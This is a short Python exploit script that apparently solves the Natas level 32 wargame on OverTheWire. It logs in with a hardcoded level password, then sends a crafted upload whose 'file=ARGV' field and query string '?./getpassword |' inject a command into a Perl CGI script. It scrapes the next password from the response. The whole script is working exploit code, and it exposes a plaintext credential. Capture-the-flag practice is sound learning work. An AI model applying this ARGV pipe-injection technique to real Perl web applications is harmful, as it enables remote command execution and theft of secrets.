#/bin/python
import requests
import re

user='natas32'
url = f"http://{user}.natas.labs.overthewire.org/?./getpassword%20|"
s = requests.Session()
s.auth = (user, 'no1vohsheCaiv3ieH4em1ahchisainge')
data={'file':'ARGV'}
files = [('file', ('my_csv.csv', b'a,b\n1,2'))]
r = s.post(url,data=data,files=files)
passwd= re.findall('<th>(.*)\n</th>',r.text)[0]
print(passwd)